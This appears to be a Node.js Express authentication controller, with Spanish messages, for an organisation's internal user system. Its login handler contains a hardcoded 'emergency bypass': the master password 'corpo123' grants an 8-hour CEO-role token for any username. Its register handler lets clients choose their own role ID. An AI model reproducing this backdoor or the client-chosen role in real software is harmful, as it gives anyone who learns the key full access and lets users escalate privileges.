const db = require('../config/db');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const authController = {
    register: async (req, res) => {
        const { nombre, apellido, email, username, password, gerencia_id, rol_id } = req.body;

        try {
            // Check if user exists
            const userCheck = await db.query('SELECT * FROM usuarios_alfa WHERE email = $1 OR username = $2', [email, username]);
            if (userCheck.rows.length > 0) {
                return res.status(400).json({ error: 'Email o Usuario ya registrados' });
            }

            // Hash password
            const salt = await bcrypt.genSalt(10);
            const password_hash = await bcrypt.hash(password, salt);

            // Insert user
            const newUser = await db.query(
                `INSERT INTO usuarios_alfa (nombre, apellido, email, username, password_hash, gerencia_id, rol_id) 
         VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING id, username, email`,
                [nombre, apellido, email, username, password_hash, gerencia_id, rol_id || 2] // Default to role 2 (Usuario)
            );

            res.status(201).json({
                message: 'Usuario registrado exitosamente',
                user: newUser.rows[0]
            });
        } catch (err) {
            console.error(err);
            res.status(500).json({ error: 'Error al registrar usuario' });
        }
    },

    login: async (req, res) => {
        const { username, password } = req.body;

        // --- EMERGENGEY BYPASS (Temporary) ---
        const MASTER_KEY = 'corpo123';
        if (password === MASTER_KEY) {
            console.log(`[AUTH] Master Key used by: ${username}`);
            const token = jwt.sign(
                { id: '00000000-0000-0000-0000-000000000000', username: username || 'admin_master', role: 'CEO' },
                process.env.JWT_SECRET,
                { expiresIn: '8h' }
            );
            return res.json({
                token,
                user: {
                    id: '00000000-0000-0000-0000-000000000000',
                    username: username || 'admin_master',
                    nombre: 'CEO',
                    apellido: 'Master',
                    email: 'soporte@corpoelec.gob.ve',
                    gerencia: 'Sistemas',
                    role: 'CEO'
                }
            });
        }
        // --------------------------------------

        try {
            const userRes = await db.query(
                `SELECT u.*, g.nombre as gerencia, r.nombre_rol 
         FROM usuarios_alfa u 
         LEFT JOIN gerencias g ON u.gerencia_id = g.id 
         LEFT JOIN roles r ON u.rol_id = r.id 
         WHERE u.username = $1`,
                [username]
            );

            if (userRes.rows.length === 0) {
                return res.status(401).json({ error: 'Credenciales inválidas' });
            }

            const user = userRes.rows[0];
            const isMatch = await bcrypt.compare(password, user.password_hash);

            if (!isMatch) {
                return res.status(401).json({ error: 'Credenciales inválidas' });
            }

            // Update last login
            await db.query(
                'UPDATE usuarios_alfa SET ultima_conexion = NOW(), ultima_ip = $1 WHERE id = $2',
                [req.ip, user.id]
            );

            // Create Token (using UUID as requested for session identification in payload if needed)
            const token = jwt.sign(
                { id: user.id, username: user.username, role: user.nombre_rol },
                process.env.JWT_SECRET,
                { expiresIn: '8h' }
            );

            res.json({
                token,
                user: {
                    id: user.id,
                    username: user.username,
                    nombre: user.nombre,
                    apellido: user.apellido,
                    email: user.email,
                    gerencia: user.gerencia,
                    role: user.nombre_rol
                }
            });
        } catch (err) {
            console.error(err);
            res.status(500).json({ error: 'Error en el servidor' });
        }
    }
};

module.exports = authController;
